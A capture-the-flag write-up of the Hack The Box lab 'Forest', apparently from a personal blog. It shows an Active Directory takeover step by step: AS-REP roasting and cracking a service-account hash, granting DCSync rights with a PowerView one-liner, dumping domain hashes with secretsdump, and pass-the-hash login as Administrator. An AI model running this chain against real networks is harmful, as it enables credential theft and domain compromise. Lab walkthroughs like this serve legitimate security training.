---
title: 'forest.htb'
date: 2023-03-07
description: 'Writeup for Forest, an easy HTB box introducing basic AD hacking concepts.'
---

## Enumeration

An initial portscan reveals the following ports:

```text
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-03-07 01:21:03Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-
Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-
Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack Microsoft Windows RPC
49957/tcp open  msrpc        syn-ack Microsoft Windows RPC
```

These open ports are typical of a Windows server. I send of some initial Windows/AD related scans including enum4linux and GetNPUsers. I populate the GetNPUsers script with the users that I enumerated from enum4linux.

These are the users that enum4linux finds:

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

I trim this list down to the following and use it as the GetNPUsers list:

```text
Administrator
Guest
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
```

The nmap scan let me know that the domain is named `htb.local`. I make that address resolve to the box IP in my `/etc/hosts` file. Then, I use the following command `impacket-GetNPUsers htb.local/ -userfiles loot/users.txt -no-pass` and get the following output:

```text
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0a1b8356909364ceb01272b62793c225$12e43501b0a048860e667d552096c4c1cd95901a522b6888a4200bfe2a0862c4b33d76682a4000b9e2cbbb27035de41c776513a12418c8cb8c5681bd6c862abaa16f5068f094376e9a07e47596d38b4cb0b73ceac8033fcf781daa17a5ac25509081780efeb9f37f152a8f438b1895226a5f516662ddfa0d27da39a3be70d2bfa433b506b5fe66fce8db973e5b51b87777c9462739b56d36273f45457c6ba985eb6378fa7572b46e92203b00fe14acafe3af127d1a150107117122251edec0363ad2fe4b9a294033db0874cd11b69e24033a68d909e5873bb524eaaefe5ed20e6ce294b4d9f7
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
```

So the user `svc-alfresco` allows pre-authorization, which let me get a TGT for that user. Lets dive into what that means.


## ASREP Roasting

When pre-authentication is enabled for a user, and that user initiates a connection with a domain controller, the user will first encrypt a timestamp with their password and the domain controller will decrypt that timestamp to determine if the user they&rsquo;re communicating with is legitimate. It will then issue them a Ticket Granting Ticket (TGT) for further authentication.

When pre-authentication is disabled for a user, the domain controller instead issues an encrypted TGT in response to an unauthenticated AS<sub>REQ</sub> request. Naively, only a legitimate user would be able to decrypt this TGT, since only they would have access to that user&rsquo;s password. But, as attackers, we can bruteforce the TGT to determine the user&rsquo;s password and gain access to the ticket itself.

For the CTF I use john to crack the TGT and get the user&rsquo;s password.

```text
~/Documents/forest [⏱ 5s]
❯ john --wordlist=/usr/share/wordlists/rockyou.txt loot/svc-alfresco.tgt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:05 DONE (2023-03-06 19:43) 0.1712g/s 699616p/s 699616c/s 699616C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## User shell

Since port 5985 is open on the CTF box, I can assume that WinRM is enabled. This is a remote management service that lets you authenticate and execute commands on the machine. I connect using `evil-winrm` and grab the user flag.


## BloodHound

Once on the machine I run some initial reconnaissance commands including `whoami /all`, and I eventually run SharpHound to populate a BloodHound graph. BloodHound maps active directory domain objects and uses graph theory to determine privilege escalation and lateral movement paths.

This is the graph that Bloodhound comes up with:

![Image of bloodhound graph, described in following parapgrah](../../../assets/writeups/htb_forest/bloodhound_graph.png)

The graph shows that the initial node, the svc-alfresco user, is a member of the &ldquo;Service Accounts&rdquo; group. This group is then a part of &ldquo;Privileged Accounts,&rdquo; which is itself a part of the &ldquo;Account Operators&rdquo; group. It then shows that the &ldquo;Account Operators&rdquo; group has the &ldquo;GenericAll&rdquo; permission over the &ldquo;Exchange Windows Permissions&rdquo; group. This privilege means that svc-alfresco has full read/write access for the &ldquo;Exchange Windows Permissions&rdquo; group.

Then, the &ldquo;Exchange Windows Permissions&rdquo; group has the &ldquo;WriteDacl&rdquo; capability against the htb.local domain. This would enable users of that group to perform operations such as &ldquo;DCSync&rdquo; which can be used to dump credentials for all users, including the Administrator, within that domain.

The killchain, therefore, is as follows:

1.  Add svc-alfresco to &ldquo;Exchange Windows Permissions&rdquo;
2.  Give svc-alfresco the DCSync rights over the domain
3.  Utilize the DCSync rights to dump domain credentials
4.  Use those credentials to authenticate as a domain administrator

To start, I execute the following command to add `svc-alfresco` to the &ldquo;Exchange Windows Permissions&rdquo; group:

```text
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange WIndows Permissions" svc-alfresco /add /domain
The command completed successfully.
```

Then, I load the &rsquo;Recon&rsquo; module of the PowerSploit powershell script library to use the convenient `Add-DomainObjectAcl` function. I find the current user&rsquo;s Powershell module path by looking at the `$Env:PSModulePath` environment variable. Then, I load the &rsquo;Recon&rsquo; folder into that directory.

```text
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules\Recon> echo $Env:PSModulePath
C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
```

```text
#*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules\Recon> dir


    Directory: C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules\Recon


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
da----         3/7/2023   7:57 AM                Dictionaries
da----         3/7/2023   7:50 AM                PowerSploit
-a----         3/7/2023   7:40 AM          17708 Get-ComputerDetail.ps1
-a----         3/7/2023   7:40 AM           3592 Get-HttpStatus.ps1
-a----         3/7/2023   7:40 AM          32639 Invoke-CompareAttributesForClass.ps1
-a----         3/7/2023   7:40 AM          44677 Invoke-Portscan.ps1
-a----         3/7/2023   7:40 AM           8085 Invoke-ReverseDnsLookup.ps1
-a----         3/7/2023   7:40 AM         770279 PowerView.ps1
-a----         3/7/2023   7:40 AM          10377 README.md
-a----         3/7/2023   7:40 AM           3146 Recon.psd1
-a----         3/7/2023   7:40 AM             67 Recon.psm1
```

I import the recon module with `Import-Module Recon`, and since I already have a process running as that user, I simply start by adding those rights to my user:

```powershell
Add-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync
```

This command hangs, and I couldn&rsquo;t figure out why. So I did some research and found that someone was using the following command and getting success:

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

Lets break down the command so that I actually learn something, splitting it into sections:

1.  `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco`

    This command adds our user to the &ldquo;Exchange Windows Permissions&rdquo; group.
2.  `$username = &ldquo;htb\svc-alfresco&rdquo;; $password = &ldquo;s3rvice&rdquo;`
    
    Here we're setting environment variables for our username and password.
3.  `$secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray()`

    This is creating a secure string object based on that password environment variable.
4.  `ForEach-Object {$secstr.AppendChar($\_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr;` -
5.  `Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync`

    Finally, this executes the function to grant our user the DCSync rights.

The reason for this one-liner is that some process is resetting the user&rsquo;s DCSync rights on a regular interval, so we need to have everything done quickly.

I execute the one-liner and immediately send off the following command from my kali machine: `impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161 | tee secretsdump.txt` and it dumps all of the password hashes, including the one for the Administrator account. I grab the Admin hash and use it to authenticate to the machine.

```text
Documents/forest/loot
❯ impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/Administrator@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator

C:\>
```

```text
C:\>cd Users/Administrator/Desktop
C:\Users\Administrator\Desktop>type root.txt
4c5d531d9ec2bcc07fff398ae31eae98
```

With Administrator access I&rsquo;m able to find the script that was responsible for resetting svc-alfresco&rsquo;s DCSync rights. Here it is below:

```powershell
C:\Users\Administrator\Documents>type revert.ps1
Import-Module C:\Users\Administrator\Documents\PowerView.ps1

$users = Get-Content C:\Users\Administrator\Documents\users.txt

while($true)

{
    Start-Sleep 60

    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)

    Foreach ($user in $users) {
        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}

        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync

        if ($groups -ne $null){
            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
        }
    }
}
```

I&rsquo;ve broken it down by adding comments to the code, here&rsquo;s the commented version:

```powershell
# This sets the 'user' variable to be the contents of the 'users.txt' file.
# The 'users.txt' file contains a list of usernames, including svc-alfresco.
$users = Get-Content C:\Users\Administrator\Documents\users.txt

# Initiating a loop that never ends.
while($true)

{
    # The loop first sleeps for 60 seconds, essentially making this
    # code execute repeatedly on an interval of 1 minute.
    Start-Sleep 60

    # This line sets the account password for svc-alfresco to 's3rvice'
    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)

    # This loop iterates over each user in the $users variable
    Foreach ($user in $users) {
        # This creates a variable 'groups' that contains a list of groups
        # that the user belongs to, as long as that group is not "Service Accounts"
        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}

        # This line removes the DCSync right from the user
        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync

        # If the group list is not empty, it executes the following code block
        if ($groups -ne $null){
            # This removes the user from all of the $groups in the groups variable
            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
        }
    }
}
```
